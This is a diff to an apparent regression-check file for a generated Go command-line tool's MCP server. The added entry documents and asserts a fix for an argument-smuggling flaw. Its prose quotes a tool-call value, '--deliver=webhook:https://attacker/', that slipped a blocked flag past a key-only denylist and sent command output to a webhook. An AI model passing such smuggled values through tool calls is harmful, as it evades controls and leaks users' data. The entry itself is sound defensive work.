@@ -383,6 +383,31 @@
      "not_contains": "chrome_cookies(\"https://%s\", cookie_file=\"%s\")"
     }
    ]
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
+   "why": "blockedRootFlags filters KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (the same generated shellout.go): a local webhook received 4,797 bytes of `doctor --json` output. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Upstream cli-printing-press 4.31.4 still emits the split form, so a reprint from the current press REINTRODUCES the defect while go build and go test stay green; this entry is what notices. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
+   "status": "active",
+   "spec_encode_followup": "DURABLE FIX belongs in cli-printing-press: the cobratree/shellout.go template must emit --flag=value for every value-carrying type (4.31.4 still emits the split form). File via printing-press-retro alongside the cookie-template findings. A full reprint at a press that carries the fix makes this entry a no-op.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"--\"+k+\"=\"+",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "not_contains": "\"--\"+k, "
+    }
+   ]
   }
  ]
 }
